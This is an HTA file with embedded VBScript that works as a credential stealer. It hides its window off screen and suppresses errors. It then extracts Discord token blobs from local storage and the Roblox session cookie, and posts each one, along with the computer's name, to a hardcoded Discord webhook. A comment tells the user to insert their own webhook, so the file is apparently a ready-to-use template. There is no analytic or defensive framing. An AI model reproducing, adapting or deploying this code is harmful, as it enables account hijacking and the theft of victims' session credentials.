<html><head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
<script language="VBScript">
window.resizeTo 0,0:window.moveTo -2000,-2000
On Error Resume Next

Dim sh, fso, WH, appdata, localappdata
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' ==========================================
' PUT YOUR WEBHOOK URL HERE (KEEP THE QUOTES)
' ==========================================
WH = "https://discord.com/api/webhooks/1568136262374793286/U6lNQnkvy-NdMd-nOUZQ77wuTTAiFy2SMwMP_kHcPKuKuEw9ERvyGUOHzvRSydAKrqas"

appdata = sh.ExpandEnvironmentStrings("%APPDATA%")
localappdata = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%")

' Send an initial hit so you know it ran
Call PostEmbed(":satellite: Hit", "PC: " & sh.ExpandEnvironmentStrings("%COMPUTERNAME%"), 3447003)

' 1. Grab Discord Tokens (Raw text extraction)
Dim dPath, dFolder, file, raw, rx, matches, m
dPath = appdata & "\discord\Local Storage\leveldb"

If fso.FolderExists(dPath) Then
    Set dFolder = fso.GetFolder(dPath)
    Set rx = CreateObject("VBScript.RegExp")
    rx.Pattern = "dQw4w9WgXcQ:[A-Za-z0-9+/=]+"
    rx.Global = True
    
    For Each file In dFolder.Files
        If LCase(Right(file.Name, 4)) = ".ldb" Or LCase(Right(file.Name, 4)) = ".log" Then
            Dim f : Set f = fso.OpenTextFile(file.Path, 1, False)
            raw = f.ReadAll
            f.Close
            
            If InStr(raw, "dQw4w9WgXcQ:") > 0 Then
                Set matches = rx.Execute(raw)
                For Each m In matches
                    Call PostEmbed(":gift: Discord Token Blob", m.Value, 5793266)
                Next
            End If
        End If
    Next
End If

' 2. Grab Roblox Cookie (Raw text extraction)
Dim rPath
rPath = localappdata & "\Roblox\LocalStorage\robloxcookies.dat"
If fso.FileExists(rPath) Then
    Dim f2 : Set f2 = fso.OpenTextFile(rPath, 1, False)
    raw = f2.ReadAll
    f2.Close
    
    ' Extract the plaintext cookie if it exists
    Set rx = CreateObject("VBScript.RegExp")
    rx.Pattern = "_\|WARNING[^""]+"
    rx.IgnoreCase = True
    
    Set matches = rx.Execute(raw)
    If matches.Count > 0 Then
        Call PostEmbed(":cookie: Roblox Cookie", matches(0).Value, 65280)
    Else
        ' If encrypted, send the raw dat string (first 1500 chars)
        If Len(raw) > 50 Then Call PostEmbed(":cookie: Roblox Encrypted", Left(raw, 1500) & "...", 16776960)
    End If
End If

window.close()

Sub PostEmbed(t, d, c)
    Dim DQ: DQ = Chr(34)
    Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", WH, False
    h.SetRequestHeader "Content-Type", "application/json"
    h.Send j
End Sub

Function Ej(s)
    Dim i, c, out
    out = ""
    For i = 1 To Len(s)
        c = Asc(Mid(s, i, 1))
        If c >= 32 Or c = 9 Or c = 10 Or c = 13 Then out = out & Mid(s, i, 1)
    Next
    out = Replace(out, Chr(92), Chr(92) & Chr(92))
    out = Replace(out, Chr(34), Chr(92) & Chr(34))
    out = Replace(out, vbCrLf, Chr(92) & "n")
    out = Replace(out, vbCr, Chr(92) & "n")
    out = Replace(out, vbLf, Chr(92) & "n")
    out = Replace(out, vbTab, Chr(92) & "t")
    Ej = out
End Function
</script>
</head><body></body></html>
